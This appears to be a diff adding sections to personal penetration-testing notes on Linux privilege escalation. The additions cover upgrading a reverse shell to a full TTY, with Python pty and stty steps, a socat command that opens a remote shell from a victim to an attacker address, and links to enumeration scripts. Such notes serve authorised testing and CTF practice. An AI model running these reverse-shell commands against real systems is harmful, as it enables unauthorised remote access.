@@ -1,3 +1,47 @@
+# Privilege elevation
+
+
+# Upgrate to TTY shell
+## Python
+````
+?? python
+which python
+locate python
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'  
+python -c 'import pty; pty.spawn("/bin/bash")'  
+````
+
+## socat
+
+On Kali (listen):
+  socat file:`tty`,raw,echo=0 tcp-listen:4444  
+On Victim (launch):
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+If socat isn't installed, you're not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:
+https://github.com/andrew-d/static-binaries
+
+## Python + full options
+Using stty options
+
+````
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+````
+
+
+
 # Operating System, kernel version, or service pack info
 ````
 cat /etc/issue
@@ -142,4 +186,11 @@ tee -a 'xx' : append to file
 
 ## Files Executed in Unrestricted Mode?
 
+
+## Put in /opt/priv_esc_ux
+- LinEnum.sh           : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+- linuxprivchecker.py
+- unixprivesc.sh
+
+Upgrate Python3 : 2to3-3.5
 Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
